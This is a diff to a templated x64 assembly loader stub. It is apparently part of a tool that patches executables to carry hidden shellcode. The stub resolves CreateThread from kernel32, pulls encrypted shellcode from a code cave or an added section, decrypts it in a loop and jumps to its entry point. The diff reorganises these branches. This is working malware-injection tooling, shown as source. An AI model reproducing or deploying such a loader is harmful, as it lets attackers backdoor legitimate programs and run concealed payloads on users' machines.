@@ -9,7 +9,7 @@
 // r15 store address of CreateThread
 
 entry:
-// get core procedure address
+// get necessary procedure address
 {{if .LackProcedure}}
   // push kernel32 module name to stack
   mov {{.Reg.rax}}, {{index .Kernel32DLLDB 0}}
@@ -217,15 +217,23 @@ pop rax
   add rsp, 0x20
   add rsp, 0x10 // restore stack
 
-// read shellcode from extended section or code cave
-{{if .SectionMode}}
+// read shellcode from different source
+{{if .CodeCave}}
+  // extract encrypted shellcode from code cave
+  mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}
+  mov {{.RegN.rdi}}, [rsp]
+  add {{.RegN.rdi}}, {{hex .EntryOffset}}
+  {{STUB CodeCaveMode STUB}}
+{{end}} // CodeCave
+
+{{if .ExtendSection}}
   // save rsi and rdi
   push rsi
   push rdi
 
   // extract encrypted shellcode from extended section
   mov rsi, {{.RegN.rdi}}
-  add rsi, {{hex .SectionOffset}}
+  add rsi, {{hex .ShellcodeOffset}}
   mov rdi, [rsp + 0x10]
   add rdi, {{hex .EntryOffset}}
   mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
@@ -255,12 +263,6 @@ pop rax
   add {{.RegV.rdx}}, 8
   sub {{.RegV.rcx}}, 8
   jnz loop_decrypt
-{{else}}
-  // extract encrypted shellcode from code cave
-  mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}
-  mov {{.RegN.rdi}}, [rsp]
-  add {{.RegN.rdi}}, {{hex .EntryOffset}}
-  {{STUB CodeCaveMode STUB}}
 {{end}} // SectionMode
 
   // get the shellcode entry point
